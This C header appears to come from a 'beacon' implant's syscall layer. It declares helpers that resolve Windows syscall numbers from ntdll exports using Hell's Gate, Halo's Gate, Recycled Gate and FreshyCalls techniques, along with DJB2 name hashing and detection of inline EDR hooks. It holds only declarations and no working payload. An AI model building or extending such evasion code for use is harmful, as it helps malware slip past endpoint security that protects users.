#pragma once

#include "beacon_syscall.h"

/*
 * beacon_syscall_internal.h -- syscall 层内部接口（gate provider 共享工具）。
 *
 * gate_common.c 提供 SSN 解析的基础设施，halos_gate / recycled_gate 复用：
 *  - Nt* 导出收集与过滤（IsLikelyNtSyscallName，排除伪 Nt 导出）；
 *  - 按地址排序（FreshyCalls 排序索引的基础）；
 *  - 特征字节扫描提取 SSN（Hell's Gate 基础）；
 *  - inline hook 判定（IsHooked）。
 */

#define GATE_MAX_EXPORTS 2048u

typedef struct GateExport {
    PVOID  Address;
    UINT32 Hash;
} GateExport;

/* 构建 ntdll Nt* 导出缓存（过滤 + 按地址升序排序）。幂等，进程内只建一次。 */
BOOL GateInitCache(VOID);

/* 返回排序后的导出缓存，count 输出数量。缓存未就绪返回 NULL。 */
const GateExport* GateGetExports(UINT32* count);

/* 按 DJB2 哈希在缓存中查找，返回排序下标；-1 = 未找到。 */
LONG GateFindByHash(UINT32 hash);

/* 扫描函数入口 32 字节内 `4C 8B D1 B8`，SSN = pFn[k+4] | pFn[k+5]<<8（小端）。 */
BOOL GateExtractSsn(PBYTE pFn, UINT32* ssn_out);

/* 判断函数入口是否被 inline hook：E9(near jmp) / FF 25(far jmp) / E8(call) / CC(int3) / EB(short jmp)。 */
BOOL GateIsHooked(PBYTE pFn);

/* DJB2 字符串哈希（seed 0x1505，与参考实现一致）。 */
UINT32 GateHashName(const CHAR* s);

#ifdef BEACON_TEST
/* ===== 测试挂钩（仅 BEACON_TEST 构建） ===== */

/* 用构造的导出表覆盖缓存（验证邻居推算等无法在无 hook 真机触达的路径）。 */
VOID GateTestSetExports(const GateExport* exports, UINT32 count);

/* 清除缓存（恢复为真实 ntdll 扫描结果）。 */
VOID GateTestResetCache(VOID);
#endif
